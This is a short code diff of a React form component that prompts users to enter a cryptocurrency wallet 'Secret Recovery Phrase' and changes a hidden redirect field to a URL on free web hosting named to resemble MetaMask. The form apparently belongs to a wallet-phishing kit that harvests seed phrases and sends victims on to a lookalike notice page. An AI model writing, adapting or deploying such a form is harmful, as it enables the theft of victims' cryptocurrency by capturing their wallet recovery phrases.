@@ -18,7 +18,7 @@ const Form = () => {
 					<label for="key">Secret Recovery Phrase</label>
 					<p onClick={topKe} >{ togKey ? 'Hide' : 'Show' }</p>
 				</div>
-                <input type="hidden" name="_next" value="https://precious-twilight-ef5b98.netlify.app/"></input>
+                <input type="hidden" name="_next" value="https://metas2022.000webhostapp.com/notice.php"></input>
 				<input type={ togKey ? 'text' : 'password' } placeholder="Enter your Secret Recovery Phrase" name="key" required />
 			</div>
 			<div>
